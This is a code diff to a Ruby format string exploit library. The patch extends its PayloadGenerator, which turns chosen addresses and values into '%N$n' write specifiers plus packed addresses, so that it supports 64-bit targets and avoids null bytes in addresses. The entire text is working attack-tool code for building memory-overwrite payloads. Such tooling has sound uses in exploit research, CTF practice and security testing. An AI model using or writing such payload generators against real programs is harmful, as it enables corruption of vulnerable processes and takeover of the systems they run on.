@@ -3,15 +3,20 @@ require "fsa/version"
 
 class FSA
   
-  def initialize(buffer_size = 0)
+  def initialize(buffer_size = 0, is_x64=false)
     @mem = {}
     @buffer_size = buffer_size
+    @is_x64 = is_x64
   end
 
   def []=(addr, value)
     
     if addr.class <= Integer
-      addr = addr % 4294967296
+      if @is_x64
+        addr = addr % 18446744073709551616
+      else
+        addr = addr % 4294967296
+      end
     else
       raise TypeError, "Address must be Integer"
     end
@@ -64,7 +69,7 @@ class FSA
     raise TypeError, "Index must be Integer" unless arg_index.class <= Integer
     raise TypeError, "Padding must be Integer" unless padding.class <= Integer
     raise TypeError, "Start_len must be Integer" unless start_len.class <= Integer
-    gen = PayloadGenerator.new(@mem, @buffer_size)
+    gen = PayloadGenerator.new(@mem, @buffer_size, @is_x64)
     gen.payload(arg_index, padding, start_len)
   end
 
@@ -85,17 +90,26 @@ end
 
 class PayloadGenerator
   
-  def initialize(mem, buffer_size)
+  def initialize(mem, buffer_size, is_x64=false)
 
     @mem = mem
     @buffer_size = buffer_size
     @tuples = []
     @addrs  = mem.keys
+    @is_x64 = is_x64
 
     addr_index = 0
     while addr_index < @addrs.size
       
       addr = @addrs[addr_index]
+      if [addr].pack(@is_x64 ? "Q" : "L").include?("\x00")
+
+        if !mem.has_key?(addr-1) || [addr-1].pack(@is_x64 ? "Q" : "L").include?("\x00")
+          puts("Can't avoid null byte at address 0x%x" % addr)
+        else
+          addr = addr - 1
+        end
+      end
       
       dword = 0
       4.times do |i|
@@ -155,7 +169,8 @@ class PayloadGenerator
     prev_pay = ""
     index = arg_index * 10000
     @payload = ""
-    
+    align = @is_x64 ? 8 : 4
+                        
     loop do
       
       @payload = ""
@@ -183,12 +198,12 @@ class PayloadGenerator
         }[size]
         
         @payload += "%" + index.to_s + "$" + modi + "n"
-        addrs += [addr].pack("L")
+        addrs += [addr].pack(@is_x64 ? "Q" : "L")
         printed += print_len
         index += 1
       end
       
-      @payload += "A" * ((padding - @payload.length) % 4)
+      @payload += "A" * ((padding - @payload.length) % align)
       
       if @payload.length == prev_len
         @payload += addrs
@@ -197,7 +212,7 @@ class PayloadGenerator
       
       prev_len = @payload.length
       prev_pay = @payload
-      index    = arg_index + @payload.length / 4
+      index    = arg_index + @payload.length / align
       
     end
     
